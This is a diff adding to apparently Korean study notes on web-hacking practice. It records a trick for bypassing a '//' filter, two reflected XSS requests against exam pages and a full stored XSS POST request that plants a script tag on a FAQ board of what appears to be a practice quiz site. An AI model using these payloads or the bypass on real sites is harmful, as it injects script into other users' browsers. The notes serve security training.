@@ -78,3 +78,52 @@ GET /exam12/notice.php?pageIndex=1&board_id=&sorting=&sotingAd=DESC&startDt=2023
 
 
 sql을 예방하기 위한 방법인 prepared statement 중 parse bind execute fetch 단계에서 bind 부분이 가장 중요함 < 더 공부하기
+
+
+##xss
+크사 공격시 //가 필터링 되어 있다면 https:www.naver.com 혹은 https:\\www.naver.com 등으로 우회할 수 있음
+
+reflected 크사 공격 예시 : GET /exam16/notice.php?pageIndex=1"><script>alert("xss")</script>&board_id=&sorting=&sotingAd=DESC&startDt=&endDt=&searchType=all&keyword=xss HTTP/1.1
+reflected크사 공격 예시 : GET /exam17/noticeview.php?pageIndex=1&board_id=';}{alert("xss");'&sorting=&sotingAd=DESC&startDt=&endDt=&searchType=all&keyword= HTTP/1.1
+
+stored 크사 공격 예시 게시판:
+POST /exam20/process/faqProcess.php HTTP/1.1
+Host: quiz.sas.ne.kr
+Content-Length: 649
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+Accept-Language: ko-KR,ko;q=0.9
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvNc3w5VLMU4OrJW7
+Origin: http://quiz.sas.ne.kr
+Referer: http://quiz.sas.ne.kr/exam20/faqwrite.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=saq70jpkrdufu9868hpjmuokn5
+Connection: keep-alive
+
+------WebKitFormBoundaryvNc3w5VLMU4OrJW7
+Content-Disposition: form-data; name="boardId"
+
+
+------WebKitFormBoundaryvNc3w5VLMU4OrJW7
+Content-Disposition: form-data; name="regType"
+
+
+------WebKitFormBoundaryvNc3w5VLMU4OrJW7
+Content-Disposition: form-data; name="title"
+
+test
+------WebKitFormBoundaryvNc3w5VLMU4OrJW7
+Content-Disposition: form-data; name="fileupload"
+
+
+------WebKitFormBoundaryvNc3w5VLMU4OrJW7
+Content-Disposition: form-data; name="aFiles"
+
+
+------WebKitFormBoundaryvNc3w5VLMU4OrJW7
+Content-Disposition: form-data; name="content"
+
+<p></p><script>alert("xss");</script>
+------WebKitFormBoundaryvNc3w5VLMU4OrJW7--
+
